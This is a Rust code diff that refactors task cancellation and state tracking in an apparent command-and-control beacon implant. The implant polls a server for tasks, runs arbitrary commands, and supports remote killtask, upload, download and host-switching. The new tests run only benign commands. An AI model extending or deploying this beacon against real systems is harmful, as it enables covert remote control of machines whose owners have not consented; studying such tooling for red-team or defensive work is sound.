@@ -54,12 +54,10 @@ pub struct BeaconRuntime {
     key: RwLock<[u8; crypto::KEY_LEN]>,
     pending: Mutex<Vec<TaskResult>>,
     accepted_task_ids: Mutex<VecDeque<Uuid>>,
-    accepted: Mutex<BoundedIds>,
+    task_states: Mutex<HashMap<Uuid, ActiveTask>>,
     completed: Mutex<BoundedIds>,
     download: RwLock<Option<Download>>,
     upload: RwLock<Option<crate::upload::Upload>>,
-    /// task id -> abort handle, for nw/killtask cancellation.
-    running: Mutex<HashMap<Uuid, tokio::task::AbortHandle>>,
     stop: AtomicBool,
 }
 
@@ -69,6 +67,12 @@ const TASK_ID_MEMORY_LIMIT: usize = 4096;
 struct BoundedIds {
     order: VecDeque<Uuid>,
     ids: HashSet<Uuid>,
+}
+
+enum ActiveTask {
+    Accepted,
+    Running(tokio::task::AbortHandle),
+    Cancelled,
 }
 
 impl BoundedIds {
@@ -115,11 +119,10 @@ impl BeaconRuntime {
             key: RwLock::new(key),
             pending: Mutex::new(Vec::new()),
             accepted_task_ids: Mutex::new(VecDeque::new()),
-            accepted: Mutex::new(BoundedIds::default()),
+            task_states: Mutex::new(HashMap::new()),
             completed: Mutex::new(BoundedIds::default()),
             download: RwLock::new(None),
             upload: RwLock::new(None),
-            running: Mutex::new(HashMap::new()),
             stop: AtomicBool::new(false),
         }
     }
@@ -135,15 +138,40 @@ impl BeaconRuntime {
     /// Force-kill an in-flight task by task id. Returns true if a child was
     /// terminated. The awaiting runner turns the killed child into a result.
     pub async fn kill_task(&self, task_id: &Uuid) -> bool {
-        let handle = self.running.lock().unwrap().remove(task_id);
-        if let Some(handle) = handle {
-            // Aborting the task future drops the child, and kill_on_drop on
-            // the runner's Command terminates the process.
-            handle.abort();
-            true
-        } else {
-            false
+        let mut states = self.task_states.lock().unwrap();
+        match states.get(task_id) {
+            Some(ActiveTask::Running(handle)) => {
+                handle.abort();
+                states.insert(*task_id, ActiveTask::Cancelled);
+                true
+            }
+            Some(ActiveTask::Accepted | ActiveTask::Cancelled) => {
+                states.insert(*task_id, ActiveTask::Cancelled);
+                true
+            }
+            None => false,
         }
+    }
+
+    fn accept_task(&self, task_id: Uuid) -> bool {
+        if self.completed.lock().unwrap().contains(&task_id)
+            || self
+                .pending
+                .lock()
+                .unwrap()
+                .iter()
+                .any(|result| result.task_id == task_id)
+        {
+            return false;
+        }
+        let mut states = self.task_states.lock().unwrap();
+        if states.contains_key(&task_id) || states.len() >= TASK_ID_MEMORY_LIMIT {
+            return false;
+        }
+        states.insert(task_id, ActiveTask::Accepted);
+        drop(states);
+        self.accepted_task_ids.lock().unwrap().push_back(task_id);
+        true
     }
 
     pub fn set_endpoint(&self, url: String) -> Result<(), String> {
@@ -339,21 +367,9 @@ impl BeaconRuntime {
         }
         let mut accepted_now = Vec::new();
         for task in pr.tasks {
-            let duplicate = self.accepted.lock().unwrap().contains(&task.id)
-                || self.completed.lock().unwrap().contains(&task.id)
-                || self.running.lock().unwrap().contains_key(&task.id)
-                || self
-                    .pending
-                    .lock()
-                    .unwrap()
-                    .iter()
-                    .any(|result| result.task_id == task.id);
-            if duplicate {
-                continue;
+            if self.accept_task(task.id) {
+                accepted_now.push(task);
             }
-            self.accepted.lock().unwrap().insert(task.id);
-            self.accepted_task_ids.lock().unwrap().push_back(task.id);
-            accepted_now.push(task);
         }
         Ok(accepted_now)
     }
@@ -361,10 +377,58 @@ impl BeaconRuntime {
     /// Run one returned task, buffering its result for the next poll. Also
     /// handles the implanted local commands (`nw/*`). Sync wrapper; the unit
     /// tests drive this directly, the beacon loop spawns it per task.
-    async fn execute(&self, tasks: &[Task]) {
+    async fn execute(self: Arc<Self>, tasks: Vec<Task>) {
+        let mut monitors = Vec::new();
         for task in tasks {
-            self.run_one(task).await;
-            self.completed.lock().unwrap().insert(task.id);
+            let task_id = task.id;
+            let mut states = self.task_states.lock().unwrap();
+            match states.get(&task_id) {
+                Some(ActiveTask::Cancelled) => {
+                    states.remove(&task_id);
+                    drop(states);
+                    self.pending.lock().unwrap().push(TaskResult {
+                        task_id,
+                        ok: false,
+                        stdout: Vec::new(),
+                        stderr: b"task cancelled".to_vec(),
+                        exit_code: -1,
+                    });
+                    self.completed.lock().unwrap().insert(task_id);
+                    continue;
+                }
+                Some(ActiveTask::Running(_)) => continue,
+                Some(ActiveTask::Accepted) => {}
+                None if states.len() < TASK_ID_MEMORY_LIMIT => {
+                    states.insert(task_id, ActiveTask::Accepted);
+                }
+                None => continue,
+            }
+            let runtime = Arc::clone(&self);
+            let handle = tokio::spawn(async move { runtime.run_one(&task).await });
+            states.insert(task_id, ActiveTask::Running(handle.abort_handle()));
+            drop(states);
+            let runtime = Arc::clone(&self);
+            monitors.push(tokio::spawn(async move {
+                if let Err(error) = handle.await {
+                    runtime.pending.lock().unwrap().push(TaskResult {
+                        task_id,
+                        ok: false,
+                        stdout: Vec::new(),
+                        stderr: if error.is_cancelled() {
+                            b"task cancelled".to_vec()
+                        } else {
+                            format!("task join error: {error}").into_bytes()
+                        },
+                        exit_code: -1,
+                    });
+                }
+                runtime.task_states.lock().unwrap().remove(&task_id);
+                runtime.completed.lock().unwrap().insert(task_id);
+            }));
+        }
+
+        for monitor in monitors {
+            let _ = monitor.await;
         }
     }
 
@@ -612,29 +676,8 @@ impl BeaconRuntime {
             }
             return;
         }
-        let handle = runner::spawn_tracked(&self.running, task.clone());
-        match handle.await {
-            Ok(result) => self.pending.lock().unwrap().push(result),
-            Err(e) if e.is_cancelled() => {
-                self.pending.lock().unwrap().push(TaskResult {
-                    task_id: task.id,
-                    ok: false,
-                    stdout: Vec::new(),
-                    stderr: b"task cancelled".to_vec(),
-                    exit_code: -1,
-                });
-            }
-            Err(e) => {
-                self.pending.lock().unwrap().push(TaskResult {
-                    task_id: task.id,
-                    ok: false,
-                    stdout: Vec::new(),
-                    stderr: format!("task join error: {}", e).into_bytes(),
-                    exit_code: -1,
-                });
-            }
-        }
-        self.running.lock().unwrap().remove(&task.id);
+        let result = runner::run(task.clone()).await;
+        self.pending.lock().unwrap().push(result);
     }
 
     fn session_key(&self) -> [u8; crypto::KEY_LEN] {
@@ -677,7 +720,7 @@ impl BeaconRuntime {
                 // beacon loop to keep polling while a child runs).
                 Ok(tasks) => {
                     let rt = Arc::clone(&self);
-                    tokio::spawn(async move { rt.execute(&tasks).await });
+                    tokio::spawn(async move { rt.execute(tasks).await });
                 }
                 Err(e) => {
                     tracing::warn!("poll failed: {}", e);
@@ -752,20 +795,130 @@ mod tests {
 
     #[tokio::test]
     async fn completed_task_is_removed_from_cancellation_registry() {
-        let runtime = runtime();
+        let runtime = Arc::new(runtime());
         let task = Task {
             id: Uuid::new_v4(),
             command: "printf".into(),
             args: vec!["done".into()],
             timeout_ms: 1_000,
         };
-        runtime.execute(std::slice::from_ref(&task)).await;
+        Arc::clone(&runtime).execute(vec![task.clone()]).await;
         assert!(!runtime.kill_task(&task.id).await);
     }
 
     #[tokio::test]
-    async fn sethost_rejects_relative_endpoint_without_mutating_runtime() {
+    async fn accepted_batch_runs_independently_and_kill_suppresses_queued_work() {
+        let runtime = Arc::new(runtime());
+        let victim = Task {
+            id: Uuid::new_v4(),
+            command: "sleep".into(),
+            args: vec!["30".into()],
+            timeout_ms: 60_000,
+        };
+        let kill = Task {
+            id: Uuid::new_v4(),
+            command: "nw/killtask".into(),
+            args: vec![victim.id.to_string()],
+            timeout_ms: 10_000,
+        };
+        assert!(runtime.accept_task(victim.id));
+        assert!(runtime.accept_task(kill.id));
+
+        tokio::time::timeout(
+            Duration::from_secs(2),
+            Arc::clone(&runtime).execute(vec![victim.clone(), kill.clone()]),
+        )
+        .await
+        .expect("kill task must not wait behind the long-running victim");
+
+        let results = runtime.pending.lock().unwrap();
+        let victim_result = results
+            .iter()
+            .find(|result| result.task_id == victim.id)
+            .expect("victim cancellation result");
+        let kill_result = results
+            .iter()
+            .find(|result| result.task_id == kill.id)
+            .expect("kill control result");
+        assert!(!victim_result.ok);
+        assert_eq!(victim_result.stderr, b"task cancelled");
+        assert!(kill_result.ok);
+    }
+
+    #[tokio::test]
+    async fn killtask_cancels_an_accepted_task_before_it_is_scheduled() {
+        let runtime = Arc::new(runtime());
+        let victim = Task {
+            id: Uuid::new_v4(),
+            command: "sleep".into(),
+            args: vec!["30".into()],
+            timeout_ms: 60_000,
+        };
+        let kill = Task {
+            id: Uuid::new_v4(),
+            command: "nw/killtask".into(),
+            args: vec![victim.id.to_string()],
+            timeout_ms: 10_000,
+        };
+        assert!(runtime.accept_task(victim.id));
+        assert!(runtime.accept_task(kill.id));
+
+        Arc::clone(&runtime).execute(vec![kill.clone()]).await;
+        tokio::time::timeout(
+            Duration::from_secs(1),
+            Arc::clone(&runtime).execute(vec![victim.clone()]),
+        )
+        .await
+        .expect("cancelled accepted task must never start");
+
+        let results = runtime.pending.lock().unwrap();
+        assert!(
+            results
+                .iter()
+                .any(|result| result.task_id == kill.id && result.ok)
+        );
+        assert!(results.iter().any(|result| {
+            result.task_id == victim.id && !result.ok && result.stderr == b"task cancelled"
+        }));
+    }
+
+    #[test]
+    fn task_id_tracking_is_bounded() {
         let runtime = runtime();
+        let mut accepted = Vec::new();
+        for _ in 0..TASK_ID_MEMORY_LIMIT {
+            let id = Uuid::new_v4();
+            assert!(runtime.accept_task(id));
+            accepted.push(id);
+        }
+        assert!(!runtime.accept_task(Uuid::new_v4()));
+        assert_eq!(
+            runtime.task_states.lock().unwrap().len(),
+            TASK_ID_MEMORY_LIMIT
+        );
+
+        let oldest = Uuid::new_v4();
+        runtime.completed.lock().unwrap().insert(oldest);
+        let mut newest = oldest;
+        for _ in 0..TASK_ID_MEMORY_LIMIT {
+            newest = Uuid::new_v4();
+            runtime.completed.lock().unwrap().insert(newest);
+        }
+        let completed = runtime.completed.lock().unwrap();
+        assert_eq!(completed.ids.len(), TASK_ID_MEMORY_LIMIT);
+        assert!(!completed.contains(&oldest));
+        assert!(completed.contains(&newest));
+        drop(completed);
+        assert_eq!(
+            runtime.accepted_task_ids.lock().unwrap().len(),
+            TASK_ID_MEMORY_LIMIT
+        );
+        assert_eq!(accepted.len(), TASK_ID_MEMORY_LIMIT);
+    }
+
+    #[tokio::test]
+    async fn sethost_rejects_relative_endpoint_without_mutating_runtime() {
+        let runtime = Arc::new(runtime());
         let task = Task {
             id: Uuid::new_v4(),
             command: "nw/sethost".into(),
@@ -773,7 +926,8 @@ mod tests {
             timeout_ms: 0,
         };
 
-        runtime.execute(std::slice::from_ref(&task)).await;
+        assert!(runtime.accept_task(task.id));
+        Arc::clone(&runtime).execute(vec![task.clone()]).await;
 
         assert_eq!(
             runtime.transport.read().unwrap().describe(),
@@ -788,7 +942,7 @@ mod tests {
 
     #[tokio::test]
     async fn sethost_rejects_non_http_scheme_without_mutating_runtime() {
-        let runtime = runtime();
+        let runtime = Arc::new(runtime());
         let task = Task {
             id: Uuid::new_v4(),
             command: "nw/sethost".into(),
@@ -796,7 +950,8 @@ mod tests {
             timeout_ms: 0,
         };
 
-        runtime.execute(std::slice::from_ref(&task)).await;
+        assert!(runtime.accept_task(task.id));
+        Arc::clone(&runtime).execute(vec![task.clone()]).await;
 
         assert_eq!(
             runtime.transport.read().unwrap().describe(),
@@ -811,7 +966,7 @@ mod tests {
 
     #[tokio::test]
     async fn sethost_switches_transport_cleanly() {
-        let runtime = runtime();
+        let runtime = Arc::new(runtime());
         let task = Task {
             id: Uuid::new_v4(),
             command: "nw/sethost".into(),
@@ -819,7 +974,8 @@ mod tests {
             timeout_ms: 0,
         };
 
-        runtime.execute(std::slice::from_ref(&task)).await;
+        assert!(runtime.accept_task(task.id));
+        Arc::clone(&runtime).execute(vec![task.clone()]).await;
 
         assert_eq!(
             runtime.transport.read().unwrap().describe(),
